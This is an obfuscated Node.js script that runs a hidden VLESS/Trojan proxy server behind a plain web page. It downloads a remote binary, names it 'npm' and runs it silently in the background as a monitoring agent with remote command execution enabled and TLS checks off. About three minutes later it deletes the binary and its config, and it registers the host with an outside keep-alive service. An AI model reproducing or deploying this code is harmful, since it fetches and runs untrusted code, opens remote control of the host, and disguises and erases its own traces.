function _0x5ce8(_0x3317ea,_0xb366b9){const _0x1f9638=_0x1f96();return _0x5ce8=function(_0x5ce867,_0x41617f){_0x5ce867=_0x5ce867-0xb2;let _0x4c1702=_0x1f9638[_0x5ce867];return _0x4c1702;},_0x5ce8(_0x3317ea,_0xb366b9);}const _0x11f695=_0x5ce8;function _0x1f96(){const _0x1a5067=['readUInt8','https://speed.cloudflare.com/meta','index.html','reduce','false','trojan://','decode','vless://','https://oooo.serv00.net/add-url','then','true','sub','message','finish','error:\x20','48UifWkn','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','writeFileSync','concat','hex','Answer','npm\x20is\x20already\x20running,\x20skip\x20running...','base64','map','Failed\x20to\x20resolve\x20','url','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','trim','https://amd64.ssss.nyc.mn/agent','includes','application/json','Unknown','npm\x20is\x20running','createWriteStream','&type=A','104XFwOGo','every','10GLMpiX','post','close','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20download\x20successfully','/bin/bash','update','config.yaml','application/dns-json','2961369CAWirN','stream','fed15498-92f7-477b-af5f-ef7767e3012a','sha224','child_process','npm','data','text/html','text/plain','toString','connect','client_secret:\x20','2083','unlink','8095kjraUU','2930040sPEVVR','digest','https://dns.google/resolve?name=','length','readUInt16BE','Hug','1009139jNkJAo','pipe','end','\x20-p\x20','NAME','chmod\x20+x\x20npm','Hello\x20world!','4014gSBxqm','type','once','Server\x20is\x20running\x20on\x20port\x20','Automatic\x20Access\x20Task\x20added\x20successfully','join','DOMAIN','&path=%2F','443','asOrganization','replace','test','log','8484wNKUqi','PORT','https://amd64.ssss.nyc.mn/v1','SUB_PATH','https://arm64.ssss.nyc.mn/agent','env','writeHead','101418oZhVNw','buffer','crypto','UUID','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','listen','utf-8','2053','arch','path','readFile','write','\x20with\x20all\x20DNS\x20servers','1.1.1.1','NEZHA_PORT','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','catch','setsid\x20nohup\x20./npm\x20-s\x20','https://arm64.ssss.nyc.mn/v1','Server','2096','get',':443?encryption=none&security=tls&sni=','NEZHA_KEY','50456406rEAKHA',':443?security=tls&sni=','slice','split','createServer','error','createHash','npm\x20running\x20error:'];_0x1f96=function(){return _0x1a5067;};return _0x1f96();}(function(_0x23505b,_0x4af5b5){const _0x36b139=_0x5ce8,_0x23c43a=_0x23505b();while(!![]){try{const _0x57972b=-parseInt(_0x36b139(0x120))/0x1+parseInt(_0x36b139(0xbd))/0x2*(-parseInt(_0x36b139(0xec))/0x3)+-parseInt(_0x36b139(0x11a))/0x4+parseInt(_0x36b139(0x119))/0x5*(-parseInt(_0x36b139(0x127))/0x6)+parseInt(_0x36b139(0xb6))/0x7*(parseInt(_0x36b139(0x100))/0x8)+-parseInt(_0x36b139(0x10b))/0x9*(parseInt(_0x36b139(0x102))/0xa)+parseInt(_0x36b139(0xd5))/0xb;if(_0x57972b===_0x4af5b5)break;else _0x23c43a['push'](_0x23c43a['shift']());}catch(_0x3b31ed){_0x23c43a['push'](_0x23c43a['shift']());}}}(_0x1f96,0x9ba75));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x11f695(0xc6)),crypto=require(_0x11f695(0xbf)),{Buffer}=require(_0x11f695(0xbe)),{exec,execSync}=require(_0x11f695(0x10f)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x11f695(0xbb)][_0x11f695(0xc0)]||_0x11f695(0x10d),NEZHA_SERVER=process[_0x11f695(0xbb)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x11f695(0xbb)][_0x11f695(0xcb)]||'',NEZHA_KEY=process[_0x11f695(0xbb)][_0x11f695(0xd4)]||'',DOMAIN=process[_0x11f695(0xbb)][_0x11f695(0x12d)]||'1234.abc.com',AUTO_ACCESS=process[_0x11f695(0xbb)]['AUTO_ACCESS']||!![],WSPATH=process['env']['WSPATH']||UUID[_0x11f695(0xd7)](0x0,0x8),SUB_PATH=process[_0x11f695(0xbb)][_0x11f695(0xb9)]||_0x11f695(0xe8),NAME=process[_0x11f695(0xbb)][_0x11f695(0x124)]||_0x11f695(0x11f),PORT=process[_0x11f695(0xbb)][_0x11f695(0xb7)]||0x5819;let ISP='';const GetISP=async()=>{const _0x2b4266=_0x11f695;try{const _0x2936c7=await axios[_0x2b4266(0xd2)](_0x2b4266(0xde)),_0x42eae9=_0x2936c7[_0x2b4266(0x111)];ISP=(_0x42eae9['country']+'-'+_0x42eae9[_0x2b4266(0xb2)])[_0x2b4266(0xb3)](/ /g,'_');}catch(_0x270e3e){ISP=_0x2b4266(0xfc);}};GetISP();const httpServer=http[_0x11f695(0xd9)]((_0x1e3811,_0x4549e1)=>{const _0x542292=_0x11f695;if(_0x1e3811[_0x542292(0xf6)]==='/'){const _0x40b96c=path[_0x542292(0x12c)](__dirname,_0x542292(0xdf));fs[_0x542292(0xc7)](_0x40b96c,'utf8',(_0x399ddc,_0x235fdb)=>{const _0x2fa1f4=_0x542292;if(_0x399ddc){_0x4549e1[_0x2fa1f4(0xbc)](0xc8,{'Content-Type':_0x2fa1f4(0x112)}),_0x4549e1[_0x2fa1f4(0x122)](_0x2fa1f4(0x126));return;}_0x4549e1[_0x2fa1f4(0xbc)](0xc8,{'Content-Type':_0x2fa1f4(0x112)}),_0x4549e1[_0x2fa1f4(0x122)](_0x235fdb);});return;}else{if(_0x1e3811[_0x542292(0xf6)]==='/'+SUB_PATH){const _0x525fd4=_0x542292(0xe4)+UUID+'@'+DOMAIN+_0x542292(0xd3)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x542292(0x12e)+WSPATH+'#'+NAME+'-'+ISP,_0x4d6e67=_0x542292(0xe2)+UUID+'@'+DOMAIN+_0x542292(0xd6)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x17d458=_0x525fd4+'\x0a'+_0x4d6e67,_0x2be916=Buffer['from'](_0x17d458)[_0x542292(0x114)](_0x542292(0xf3));_0x4549e1[_0x542292(0xbc)](0xc8,{'Content-Type':_0x542292(0x113)}),_0x4549e1['end'](_0x2be916+'\x0a');}else _0x4549e1[_0x542292(0xbc)](0x194,{'Content-Type':'text/plain'}),_0x4549e1[_0x542292(0x122)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x11f695(0xd0))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x11f695(0xca)];function resolveHost(_0x4c39cc){return new Promise((_0x58d908,_0x646b90)=>{const _0x50d4ce=_0x5ce8;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x50d4ce(0xb4)](_0x4c39cc)){_0x58d908(_0x4c39cc);return;}let _0x214e1e=0x0;function _0xbd9ac5(){const _0x13d703=_0x50d4ce;if(_0x214e1e>=DNS_SERVERS[_0x13d703(0x11d)]){_0x646b90(new Error(_0x13d703(0xf5)+_0x4c39cc+_0x13d703(0xc9)));return;}const _0x47c7bd=DNS_SERVERS[_0x214e1e];_0x214e1e++;const _0x1f0b35=_0x13d703(0x11c)+encodeURIComponent(_0x4c39cc)+_0x13d703(0xff);axios[_0x13d703(0xd2)](_0x1f0b35,{'timeout':0x1388,'headers':{'Accept':_0x13d703(0x10a)}})[_0x13d703(0xe6)](_0x3d01fb=>{const _0x597f6e=_0x13d703,_0x1b3a80=_0x3d01fb[_0x597f6e(0x111)];if(_0x1b3a80['Status']===0x0&&_0x1b3a80[_0x597f6e(0xf1)]&&_0x1b3a80[_0x597f6e(0xf1)]['length']>0x0){const _0x504b93=_0x1b3a80[_0x597f6e(0xf1)]['find'](_0xa54074=>_0xa54074[_0x597f6e(0x128)]===0x1);if(_0x504b93){_0x58d908(_0x504b93[_0x597f6e(0x111)]);return;}}_0xbd9ac5();})['catch'](_0x3a51b0=>{_0xbd9ac5();});}_0xbd9ac5();});}function handleVlessConnection(_0x49835c,_0x39fd68){const _0x4f7aba=_0x11f695,[_0x37276b]=_0x39fd68,_0x38fefd=_0x39fd68[_0x4f7aba(0xd7)](0x1,0x11);if(!_0x38fefd[_0x4f7aba(0x101)]((_0x5dbc78,_0x2f4e06)=>_0x5dbc78==parseInt(uuid['substr'](_0x2f4e06*0x2,0x2),0x10)))return![];let _0x19e415=_0x39fd68[_0x4f7aba(0xd7)](0x11,0x12)[_0x4f7aba(0xdd)]()+0x13;const _0x124d7f=_0x39fd68[_0x4f7aba(0xd7)](_0x19e415,_0x19e415+=0x2)[_0x4f7aba(0x11e)](0x0),_0x57928e=_0x39fd68[_0x4f7aba(0xd7)](_0x19e415,_0x19e415+=0x1)[_0x4f7aba(0xdd)](),_0x3d74a4=_0x57928e==0x1?_0x39fd68[_0x4f7aba(0xd7)](_0x19e415,_0x19e415+=0x4)['join']('.'):_0x57928e==0x2?new TextDecoder()[_0x4f7aba(0xe3)](_0x39fd68['slice'](_0x19e415+0x1,_0x19e415+=0x1+_0x39fd68[_0x4f7aba(0xd7)](_0x19e415,_0x19e415+0x1)[_0x4f7aba(0xdd)]())):_0x57928e==0x3?_0x39fd68['slice'](_0x19e415,_0x19e415+=0x10)[_0x4f7aba(0xe0)]((_0x1a4c2a,_0x54b9f4,_0x38c965,_0x47d782)=>_0x38c965%0x2?_0x1a4c2a[_0x4f7aba(0xef)](_0x47d782[_0x4f7aba(0xd7)](_0x38c965-0x1,_0x38c965+0x1)):_0x1a4c2a,[])[_0x4f7aba(0xf4)](_0x28ace9=>_0x28ace9[_0x4f7aba(0x11e)](0x0)[_0x4f7aba(0x114)](0x10))['join'](':'):'';_0x49835c['send'](new Uint8Array([_0x37276b,0x0]));const _0x1f8162=createWebSocketStream(_0x49835c);return resolveHost(_0x3d74a4)[_0x4f7aba(0xe6)](_0x55f004=>{const _0x2795dc=_0x4f7aba;net['connect']({'host':_0x55f004,'port':_0x124d7f},function(){const _0x3f5bf2=_0x5ce8;this['write'](_0x39fd68[_0x3f5bf2(0xd7)](_0x19e415)),_0x1f8162['on'](_0x3f5bf2(0xda),()=>{})[_0x3f5bf2(0x121)](this)['on'](_0x3f5bf2(0xda),()=>{})[_0x3f5bf2(0x121)](_0x1f8162);})['on'](_0x2795dc(0xda),()=>{});})[_0x4f7aba(0xcd)](_0x4f0bb9=>{const _0x3357b3=_0x4f7aba;net[_0x3357b3(0x115)]({'host':_0x3d74a4,'port':_0x124d7f},function(){const _0x305f1c=_0x3357b3;this[_0x305f1c(0xc8)](_0x39fd68[_0x305f1c(0xd7)](_0x19e415)),_0x1f8162['on'](_0x305f1c(0xda),()=>{})[_0x305f1c(0x121)](this)['on']('error',()=>{})[_0x305f1c(0x121)](_0x1f8162);})['on'](_0x3357b3(0xda),()=>{});}),!![];}function handleTrojanConnection(_0x253d33,_0x34fa35){const _0xbbeaac=_0x11f695;try{if(_0x34fa35['length']<0x3a)return![];const _0x3ab427=_0x34fa35[_0xbbeaac(0xd7)](0x0,0x38)['toString'](),_0x17173f=[UUID];let _0x47fd7e=null;for(const _0xa09789 of _0x17173f){const _0x4639c0=crypto[_0xbbeaac(0xdb)](_0xbbeaac(0x10e))[_0xbbeaac(0x108)](_0xa09789)[_0xbbeaac(0x11b)](_0xbbeaac(0xf0));if(_0x4639c0===_0x3ab427){_0x47fd7e=_0xa09789;break;}}if(!_0x47fd7e)return![];let _0x2fadb4=0x38;_0x34fa35[_0x2fadb4]===0xd&&_0x34fa35[_0x2fadb4+0x1]===0xa&&(_0x2fadb4+=0x2);const _0x465890=_0x34fa35[_0x2fadb4];if(_0x465890!==0x1)return![];_0x2fadb4+=0x1;const _0x3cf1d4=_0x34fa35[_0x2fadb4];_0x2fadb4+=0x1;let _0x3da3a7,_0x1be283;if(_0x3cf1d4===0x1)_0x3da3a7=_0x34fa35[_0xbbeaac(0xd7)](_0x2fadb4,_0x2fadb4+0x4)['join']('.'),_0x2fadb4+=0x4;else{if(_0x3cf1d4===0x3){const _0x585706=_0x34fa35[_0x2fadb4];_0x2fadb4+=0x1,_0x3da3a7=_0x34fa35[_0xbbeaac(0xd7)](_0x2fadb4,_0x2fadb4+_0x585706)['toString'](),_0x2fadb4+=_0x585706;}else{if(_0x3cf1d4===0x4)_0x3da3a7=_0x34fa35[_0xbbeaac(0xd7)](_0x2fadb4,_0x2fadb4+0x10)[_0xbbeaac(0xe0)]((_0x660fc1,_0x183e7a,_0x5c13f0,_0x1a6106)=>_0x5c13f0%0x2?_0x660fc1['concat'](_0x1a6106[_0xbbeaac(0xd7)](_0x5c13f0-0x1,_0x5c13f0+0x1)):_0x660fc1,[])[_0xbbeaac(0xf4)](_0x4a6dc8=>_0x4a6dc8['readUInt16BE'](0x0)[_0xbbeaac(0x114)](0x10))[_0xbbeaac(0x12c)](':'),_0x2fadb4+=0x10;else return![];}}_0x1be283=_0x34fa35[_0xbbeaac(0x11e)](_0x2fadb4),_0x2fadb4+=0x2;_0x2fadb4<_0x34fa35['length']&&_0x34fa35[_0x2fadb4]===0xd&&_0x34fa35[_0x2fadb4+0x1]===0xa&&(_0x2fadb4+=0x2);const _0x566a7e=createWebSocketStream(_0x253d33);return resolveHost(_0x3da3a7)['then'](_0x446c87=>{const _0xbca551=_0xbbeaac;net[_0xbca551(0x115)]({'host':_0x446c87,'port':_0x1be283},function(){const _0x49fb4a=_0xbca551;_0x2fadb4<_0x34fa35['length']&&this[_0x49fb4a(0xc8)](_0x34fa35[_0x49fb4a(0xd7)](_0x2fadb4)),_0x566a7e['on'](_0x49fb4a(0xda),()=>{})[_0x49fb4a(0x121)](this)['on']('error',()=>{})[_0x49fb4a(0x121)](_0x566a7e);})['on'](_0xbca551(0xda),()=>{});})[_0xbbeaac(0xcd)](_0x101059=>{const _0x4f2e7f=_0xbbeaac;net[_0x4f2e7f(0x115)]({'host':_0x3da3a7,'port':_0x1be283},function(){const _0x52c51a=_0x4f2e7f;_0x2fadb4<_0x34fa35[_0x52c51a(0x11d)]&&this[_0x52c51a(0xc8)](_0x34fa35[_0x52c51a(0xd7)](_0x2fadb4)),_0x566a7e['on']('error',()=>{})['pipe'](this)['on'](_0x52c51a(0xda),()=>{})[_0x52c51a(0x121)](_0x566a7e);})['on']('error',()=>{});}),!![];}catch(_0x151ede){return![];}}wss['on']('connection',(_0x17682a,_0x171e8e)=>{const _0x512c14=_0x11f695,_0x262d2c=_0x171e8e['url']||'';_0x17682a[_0x512c14(0x129)](_0x512c14(0xe9),_0x34c2d1=>{const _0x5d7f8d=_0x512c14;if(_0x34c2d1[_0x5d7f8d(0x11d)]>0x11&&_0x34c2d1[0x0]===0x0){const _0x4b4601=_0x34c2d1[_0x5d7f8d(0xd7)](0x1,0x11),_0x4f0664=_0x4b4601['every']((_0x5322fb,_0x3d6c4d)=>_0x5322fb==parseInt(uuid['substr'](_0x3d6c4d*0x2,0x2),0x10));if(_0x4f0664){!handleVlessConnection(_0x17682a,_0x34c2d1)&&_0x17682a[_0x5d7f8d(0x104)]();return;}}!handleTrojanConnection(_0x17682a,_0x34c2d1)&&_0x17682a[_0x5d7f8d(0x104)]();})['on'](_0x512c14(0xda),()=>{});});const getDownloadUrl=()=>{const _0x7d19b7=_0x11f695,_0x374a11=os[_0x7d19b7(0xc5)]();return _0x374a11==='arm'||_0x374a11==='arm64'||_0x374a11==='aarch64'?!NEZHA_PORT?_0x7d19b7(0xcf):_0x7d19b7(0xba):!NEZHA_PORT?_0x7d19b7(0xb8):_0x7d19b7(0xf9);},downloadFile=async()=>{const _0x2d1a7b=_0x11f695;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x24acb5=getDownloadUrl(),_0x1fd773=await axios({'method':_0x2d1a7b(0xd2),'url':_0x24acb5,'responseType':_0x2d1a7b(0x10c)}),_0x359798=fs[_0x2d1a7b(0xfe)](_0x2d1a7b(0x110));return _0x1fd773[_0x2d1a7b(0x111)][_0x2d1a7b(0x121)](_0x359798),new Promise((_0x38a028,_0x1bfca6)=>{const _0x3913e2=_0x2d1a7b;_0x359798['on'](_0x3913e2(0xea),()=>{const _0x6e8034=_0x3913e2;console[_0x6e8034(0xb5)](_0x6e8034(0x106)),exec(_0x6e8034(0x125),_0x36fa71=>{if(_0x36fa71)_0x1bfca6(_0x36fa71);_0x38a028();});}),_0x359798['on'](_0x3913e2(0xda),_0x1bfca6);});}catch(_0x9a3be){throw _0x9a3be;}},runnz=async()=>{const _0x506061=_0x11f695;try{const _0x435f79=execSync(_0x506061(0xf7),{'encoding':_0x506061(0xc3)});if(_0x435f79[_0x506061(0xf8)]()!==''){console[_0x506061(0xb5)](_0x506061(0xf2));return;}}catch(_0xc21ec7){}await downloadFile();let _0x5efcf1='',_0x107d47=[_0x506061(0x12f),'8443',_0x506061(0xd1),'2087',_0x506061(0x117),_0x506061(0xc4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x8834b0=_0x107d47[_0x506061(0xfa)](NEZHA_PORT)?'--tls':'';_0x5efcf1=_0x506061(0xce)+NEZHA_SERVER+':'+NEZHA_PORT+_0x506061(0x123)+NEZHA_KEY+'\x20'+_0x8834b0+_0x506061(0x105);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xe4f05a=NEZHA_SERVER[_0x506061(0xfa)](':')?NEZHA_SERVER[_0x506061(0xd8)](':')['pop']():'',_0x14bf2b=_0x107d47['includes'](_0xe4f05a)?_0x506061(0xe7):_0x506061(0xe1),_0x1bfb5e=_0x506061(0x116)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x506061(0xed)+_0x14bf2b+_0x506061(0xc1)+UUID;fs[_0x506061(0xee)]('config.yaml',_0x1bfb5e);}_0x5efcf1=_0x506061(0xcc);}else{console[_0x506061(0xb5)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5efcf1,{'shell':_0x506061(0x107)},_0x7131d5=>{const _0x27fa62=_0x506061;if(_0x7131d5)console['error'](_0x27fa62(0xdc),_0x7131d5);else console['log'](_0x27fa62(0xfd));});}catch(_0x2cb254){console[_0x506061(0xda)](_0x506061(0xeb)+_0x2cb254);}};async function addAccessTask(){const _0x18e6f4=_0x11f695;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x185204='https://'+DOMAIN;try{const _0x25b279=await axios[_0x18e6f4(0x103)](_0x18e6f4(0xe5),{'url':_0x185204},{'headers':{'Content-Type':_0x18e6f4(0xfb)}});console[_0x18e6f4(0xb5)](_0x18e6f4(0x12b));}catch(_0x89d304){}}const delFiles=()=>{const _0x223448=_0x11f695;fs[_0x223448(0x118)](_0x223448(0x110),()=>{}),fs[_0x223448(0x118)](_0x223448(0x109),()=>{});};httpServer[_0x11f695(0xc2)](PORT,()=>{const _0x140f8f=_0x11f695;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x140f8f(0xb5)](_0x140f8f(0x12a)+PORT);});
